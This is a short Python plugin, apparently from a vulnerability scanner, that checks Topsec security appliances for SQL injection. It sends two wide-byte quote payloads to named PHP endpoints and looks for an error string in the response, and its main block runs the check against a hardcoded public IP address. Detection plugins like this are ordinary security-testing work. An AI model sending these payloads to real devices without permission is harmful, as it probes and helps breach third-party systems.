#/usr/bin/env python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0135532
#__Author__ = 上善若水
#_PlugName_ = tianrongxin_sql Plugin
#_FileName_ = tianrongxin_sql.py

import re

def assign(service, arg):
    if service == "topsec":
        return True, arg 	

def audit(arg):
    payloads = ('policy/cap/delete.php?returnfile=timegrouptable.php&TABLE=timegroup&deletename=sqltestvul%df%27&name=timegroupname','policy/kw/delkeywd.php?kwtypename=sqltestvul%df%27')
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode, _url = curl.curl2(url)
        m = re.findall('thrown in <b>(.*?)</b>',res)
        # print m
        if code == 200 and m: 
            security_hole(url)            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('topsec', 'http://211.137.103.100:8080/')[1])